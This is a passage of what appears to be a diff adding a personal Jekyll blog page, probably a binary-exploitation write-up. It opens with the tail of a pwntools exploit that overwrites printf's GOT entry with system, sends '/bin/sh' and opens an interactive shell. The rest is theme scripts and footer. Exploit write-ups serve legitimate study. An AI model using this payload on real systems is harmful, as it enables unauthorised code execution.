+payload_overwrite_got = write(libc_system, elf.symbols['got.printf'])
+log.info(f'sending overwrite payload {payload_overwrite_got}')
+r.sendline(payload_overwrite_got)
+r.sendline(b'/bin/sh\x00')
+r.recv()
+r.interactive()
+</code></pre></div></div>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2020-03-21T00:00:00+00:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"></div></footer>
+</div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jakub Acs"><meta itemprop="url" content="/"><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Send me an Email.">
+      <a class="button button--circle mail-button" itemprop="email" href="mailto:acsjakub@gmail.com" target="_blank">
+        <i class="fas fa-envelope"></i>
+      </a><li title="Follow me on Twitter.">
+        <a class="button button--circle twitter-button" itemprop="sameAs" href="https://twitter.com/acs_jakub" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M1024.032 194.432c-37.664 16.704-78.176 28-120.672 33.088 43.36-26.016 76.672-67.168 92.384-116.224-40.608 24.064-85.568 41.568-133.408 50.976-38.336-40.832-92.928-66.336-153.344-66.336-116.032 0-210.08 94.048-210.08 210.08 0 16.48 1.856 32.512 5.44 47.872-174.592-8.768-329.408-92.416-433.024-219.52-18.08 31.04-28.448 67.104-28.448 105.632 0 72.896 37.088 137.184 93.472 174.88-34.432-1.088-66.816-10.528-95.168-26.272-0.032 0.864-0.032 1.76-0.032 2.656 0 101.792 72.416 186.688 168.512 205.984-17.632 4.8-36.192 7.36-55.36 7.36-13.536 0-26.688-1.312-39.52-3.776 26.72 83.456 104.32 144.192 196.256 145.888-71.904 56.352-162.496 89.92-260.928 89.92-16.96 0-33.664-0.992-50.112-2.944 92.96 59.616 203.392 94.4 322.048 94.4 386.432 0 597.728-320.128 597.728-597.76 0-9.12-0.192-18.176-0.608-27.168 41.056-29.632 76.672-66.624 104.832-108.736z" />
+</svg>
+</div>
+        </a>
+      </li><li title="Follow me on Linkedin.">
+        <a class="button button--circle linkedin-button" itemprop="sameAs" href="https://www.linkedin.com/in/acsjakub" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M260.096 155.648c0 27.307008-9.899008 50.516992-29.696 69.632-19.796992 19.115008-45.396992 28.672-76.8 28.672-30.036992 0-54.612992-9.556992-73.728-28.672-19.115008-19.115008-28.672-42.324992-28.672-69.632 0-28.672 9.556992-52.224 28.672-70.656 19.115008-18.432 44.372992-27.648 75.776-27.648 31.403008 0 56.32 9.216 74.752 27.648 18.432 18.432 28.331008 41.984 29.696 70.656 0 0 0 0 0 0m-202.752 808.96c0 0 0-632.832 0-632.832 0 0 196.608 0 196.608 0 0 0 0 632.832 0 632.832 0 0-196.608 0-196.608 0 0 0 0 0 0 0m313.344-430.08c0-58.708992-1.364992-126.292992-4.096-202.752 0 0 169.984 0 169.984 0 0 0 10.24 88.064 10.24 88.064 0 0 4.096 0 4.096 0 40.96-68.267008 105.812992-102.4 194.56-102.4 68.267008 0 123.220992 22.868992 164.864 68.608 41.643008 45.739008 62.464 113.664 62.464 203.776 0 0 0 374.784 0 374.784 0 0-196.608 0-196.608 0 0 0 0-350.208 0-350.208 0-91.476992-33.451008-137.216-100.352-137.216-47.787008 0-81.236992 24.576-100.352 73.728-4.096 8.192-6.144 24.576-6.144 49.152 0 0 0 364.544 0 364.544 0 0-198.656 0-198.656 0 0 0 0-430.08 0-430.08 0 0 0 0 0 0" />
+</svg>
+</div>
+        </a>
+      </li><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/acsjakub" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© Jakub Acs's Personal Blog 2020,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
